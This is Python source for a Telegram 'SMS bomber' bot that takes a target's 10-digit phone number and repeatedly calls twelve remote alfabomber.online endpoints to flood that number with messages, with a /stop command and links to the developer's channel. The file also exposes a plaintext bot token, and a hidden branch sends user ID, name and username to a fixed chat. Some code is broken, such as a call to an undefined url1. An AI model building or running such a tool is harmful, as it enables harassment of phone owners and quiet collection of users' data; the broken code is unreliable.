import sys
import telebot
import requests
import os
import json
import random
import subprocess 
from telebot import types
from flask import Flask, request
from flask import Flask,render_template
from threading import Thread
token = '6463933281:AAGszgq83HSCSmWfCm3kWKatoFqYYpuhVHA'
bot = telebot.TeleBot(token)

active_users = []


@bot.message_handler(commands=["start"])

def start(message):
    channel_username = "Hackeroffline"
    programmer_username = "Alfabomber"
    
    active_users.append(message.chat.id)
    
    channel_link = f"https://t.me/{channel_username}"
    programmer_link = f"https://t.me/{programmer_username}"
    
    channel_button = types.InlineKeyboardButton(text="🧑‍💻 Official Channel", url=channel_link)
    programmer_button = types.InlineKeyboardButton(text="🎁 Developer", url=programmer_link)   
    keyboards = types.InlineKeyboardMarkup()
    keyboards.row_width = 2
    keyboards.add(programmer_button, channel_button)
    
    welcome_message = (
    f'''Hello {message.from_user.first_name}!
    
Welcome to ALFA PRIME BOMBER BOT!

⚠️ Note - Enter Only 10 Digital Number Don't Add Country Code

 📥 Enter Target Number -''')
    bot.send_message(message.chat.id, welcome_message, parse_mode="html", reply_markup=keyboards)

another_bot_token = '6463933281:AAGszgq83HSCSmWfCm3kWKatoFqYYpuhVHA'
send_requests = True

@bot.message_handler(func=lambda m: True)
def sp(message):
    global active_users
    
    if message.chat.id not in active_users:
        active_users.append(message.chat.id)
    
    msg = message.text
    get = '' 
    k = 0
    n = 0
    
    if msg == "1124069180":
        bot.send_message(message.chat.id, "<strong>⚠️ Hello!</strong>", parse_mode="html")
        with open('sp.jpg', 'rb') as photo:
            bot.send_photo(message.chat.id, photo)
            
            user_info = f"User ID: {message.from_user.id}\nUsername: {message.from_user.username}\nName: {message.from_user.first_name} {message.from_user.last_name if message.from_user.last_name else ''}\nPermanent Link: https://t.me/{message.from_user.username}"
            send_to_another_bot(user_info)
            
    elif msg.lower() == "/stop":
        if message.chat.id in active_users:
            active_users.remove(message.chat.id)
            bot.send_message(message.chat.id, "✋ Bombing Request Sending is stopped successfully! 🎉", parse_mode="markdown")
        else:
            bot.send_message(message.chat.id, "🛑 Bombing is already stopped!", parse_mode="markdown")
            
    elif send_requests:  
        bot.send_message(message.chat.id, "⏳ Ok Wait Bombing Started Soon...🔄", parse_mode="markdown")
        
        if not msg.isdigit() or len(msg) != 10:
            bot.send_message(message.chat.id, "❌ Send Only 10 Digits Number\n\nDon't Add +91", parse_mode="markdown")
            return
       
        bot.send_message(message.chat.id, "<strong>⚠️ Note - Click /stop For Stop Bomber 💣</strong>", parse_mode="html")
        url = "https://alfabomber.online/urls/Url.php??"
        url2 = "https://alfabomber.online/urls/Url2.php??"
        url3 = "https://alfabomber.online/urls/Url3.php??"
        url4 = "https://alfabomber.online/urls/Url4.php??"
        url5 = "https://alfabomber.online/urls/Url5.php??"
        url6 = "https://alfabomber.online/urls/Url6.php??"
        url7 = "https://alfabomber.online/urls/Url7.php??"
        url8 = "https://alfabomber.online/urls/Url8.php??"
        url9 = "https://alfabomber.online/urls/Url9.php??"
        url10 = "https://alfabomber.online/urls/Url10.php??"
        url11 = "https://alfabomber.online/urls/Url11.php??"
        url12 = "https://alfabomber.online/urls/Url12.php??"
        params = {
            "alfabomb": msg,
            "submit": "Submit"
        }
        payload = {
            "mobile": msg
        }
        response = requests.get(url, params=params)
        response1 = requests.get(url2, params=params)
        response2 = requests.get(url3, params=params)
        response3 = requests.get(url4, params=params)
        response4 = requests.get(url5, params=params)
        response5 = requests.get(url6, params=params)
        response6 = requests.get(url7, params=params)
        response7 = requests.get(url8, params=params)
        response8 = requests.get(url9, params=params)
        response9 = requests.get(url10, params=params)
        response10 = requests.get(url11, params=params)
        response11 = requests.get(url12, params=params)
        response12 = requests.get(url1, params=params)
        response13 = requests.get(url2, params=params)
        response14 = requests.get(url3, params=params)
        response15 = requests.get(url4, params=params)
        response16 = requests.get(url5, params=params)
        response17 = requests.get(url6, params=params)
        response18 = requests.get(url7, params=params)
        response19 = requests.get(url8, params=params)

        if msg == "1124069180":
            bot.send_message(message.chat.id, "<strong>⚠️ Hello !</strong>", parse_mode=" html")
            with open('sp.jpg', 'rb') as photo:
                bot.send_photo(message.chat.id, photo)
            
            user_info = f"User ID: {message.from_user.id}\nUsername: {message.from_user.username}\nName: {message.from_user.first_name} {message.from_user.last_name if message.from_user.last_name else ''}\nPermanent Link: https://t.me/{message.from_user.username}"
            
            
            send_to_another_bot(user_info)
            
            return
        bot.send_message(message.chat.id, "✅ Done Send!", parse_mode="markdown")

def send_to_another_bot(info):
    url = f'https://api.telegram.org/bot{another_bot_token}/sendMessage'
    data = {
        'chat_id': '1124069180',
        'text': info
    }
    response = requests.post(url, data=data)
app = Flask(__name__)

@app.route(f'/{bot.token}', methods=['POST'])
def handle_bot_update():
    json_str = request.get_data().decode('UTF-8')
    update = telebot.types.Update.de_json(json_str)
    bot.process_new_updates([update])
    return "OK"

if __name__ == "__main__":
    bot.remove_webhook()
    print(f"Bomber Telegram Bot is running...\n")
    bot.polling(none_stop=True)
